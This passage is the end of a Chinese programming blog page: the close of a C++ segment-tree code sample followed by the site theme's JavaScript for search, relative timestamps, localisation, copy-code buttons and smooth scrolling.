    // cout&amp;lt;&amp;lt;tre[1].val;
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;q);
    while(q--)
    {
        scanf(&amp;quot;%d %d&amp;quot;,&amp;amp;l,&amp;amp;r);
        printf(&amp;quot;%lld\n&amp;quot;,query_itv(l,r,1));
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">线段树维护区间最值问题</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + '秒之前';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + '分钟之前';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + '小时之前';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + '天之前';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }

  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


  <script
    src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
  <script>
    var scroll = new SmoothScroll('a[href*="#"]', {
      speed: 200
    });
  </script>






</html>